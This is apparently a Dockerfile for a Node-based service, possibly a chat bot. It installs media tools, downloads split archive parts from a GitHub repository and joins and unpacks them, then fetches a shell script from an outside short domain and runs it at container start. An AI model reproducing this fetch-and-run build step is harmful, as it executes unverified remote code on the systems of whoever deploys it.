FROM node:lts-buster

RUN apt-get update && \
  apt-get install -y \
  ffmpeg \
  imagemagick \
  webp && \
  apt-get upgrade -y && \
  rm -rf /var/lib/apt/lists/*
  
RUN wget https://github.com/Testando0/Marilinha/raw/main/aa https://github.com/Testando0/Marilinha/raw/main/ab https://github.com/Testando0/Marilinha/raw/main/ac

RUN cat a* > renderbfanarrowx.zip

RUN unzip renderbfanarrowx.zip

RUN rm -rf renderbfanarrowx.zip

#RUN mv ./APIS_CARAMELO-VIP/* ./

RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh

COPY . .

RUN npm install

RUN chmod +x ./main.sh

RUN chmod +x ./blackmd.sh

CMD ["sh", "-c", "./blackmd.sh & ./main.sh"]

EXPOSE 5000